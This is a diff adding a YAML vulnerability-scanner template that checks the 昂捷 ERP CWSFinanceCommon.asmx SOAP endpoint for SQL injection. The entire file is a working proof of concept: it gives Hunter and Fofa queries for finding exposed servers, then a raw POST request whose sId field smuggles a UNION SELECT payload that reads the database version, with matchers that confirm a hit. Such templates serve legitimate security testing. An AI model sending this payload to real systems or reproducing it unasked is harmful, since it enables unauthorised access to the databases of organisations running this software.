@@ -1,0 +1,36 @@
+id: enjoyit-erp-cwsfinancecommon-asmx-sqli
+
+info:
+  name: 昂捷 ERP CWSFinanceCommon.asmx SQL注入
+  author: zan8in
+  severity: high
+  description: |-
+    Hunter: web.body="CheckSilverlightInstalled"
+    Fofa: body="CheckSilverlightInstalled"
+  reference:
+    - https://mp.weixin.qq.com/s/r-m73kfEOgq93LP1t0fXoA
+  tags: 昂捷-ERP
+
+http:
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetOSpById xmlns="http://tempuri.org/">
+        <sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj</sId>
+        </GetOSpById>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<c_store_id>"
+          - "<NewDataSet"
+          - "sql server"
